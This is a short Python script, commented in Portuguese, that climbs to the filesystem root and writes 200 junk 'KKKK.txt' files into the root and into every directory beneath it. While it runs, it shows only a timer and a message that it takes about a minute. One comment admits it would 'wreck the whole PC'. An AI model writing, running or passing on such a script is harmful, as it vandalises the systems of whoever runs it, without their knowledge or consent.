import os
import time

clear = lambda: os.system('cls')

t1 = time.time()

n = 200 # números de arquivos a ser criados
total_time = 0

def printtempo():
    clear()
    ct = time.time() - t1
    print('tempo total na inicializacao do programa:\n', f"{ct:.2f}")
    print('demora em media 1 minuto!')

dir_p = os.path.dirname(__file__)
while True:
    try:
        if (os.path.dirname(dir_p)) != dir_p:
            penultimo = dir_p
            dir_p = os.path.dirname(dir_p)
            printtempo()
            continue
        else:
            raise Exception
        
    except BaseException:
        #dir_p = penultimo #descomentar para deixar mais de boa senão ferra o pc inteiro
        # print('limite f', dir_p)
        break
# dir_p = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
for i in range(n):
    nome = str(i) + 'KKKK.txt'
    arqui = os.path.join(dir_p, nome)
    with open(arqui, 'w') as f:
        printtempo()
        f.write('kkkk')

for dir_, b, *c in os.walk(dir_p):
    printtempo()
    for i in b:
        final_dir = os.path.join(dir_, i)
        for i in range(n):
            nome = str(i) + 'KKKK.txt'
            arqui = os.path.join(final_dir, nome)
            with open(arqui, 'w') as f:
                printtempo()
                f.write('kkkk')
        printtempo()

        a = os.walk(final_dir)
        for i in a:
            for j in i:
                if type(j) == list:
                    for k in j:
                        # print('123')
                        printtempo()
                else:
                    printtempo()
